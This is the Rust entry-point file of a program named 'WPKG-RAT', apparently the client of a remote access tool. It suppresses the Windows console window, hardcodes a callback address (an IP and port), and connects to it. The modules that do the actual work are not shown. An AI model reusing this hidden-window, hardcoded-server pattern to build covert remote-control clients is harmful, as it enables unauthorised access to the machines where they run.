// Remove console window in Windows OS
#![windows_subsystem = "windows"]

use crate::client::*;

use simplelog::*;

mod addreses;
mod client;
mod globals;
mod send_api_request;
mod types;
mod utils;

pub use send_api_request::*;
use lazy_static::lazy_static;

lazy_static! {
    pub static ref TCP_ADDRESS: String = "136.243.156.104:3217".to_string();
}

#[tokio::main]
async fn main() 
{
    println!("WPKG-RAT {}",env!("CARGO_PKG_VERSION"));

    CombinedLogger::init(vec![TermLogger::new(
        LevelFilter::Trace,
        Config::default(),
        TerminalMode::Mixed,
        ColorChoice::Auto,
    )])
    .unwrap();

    connect();
}
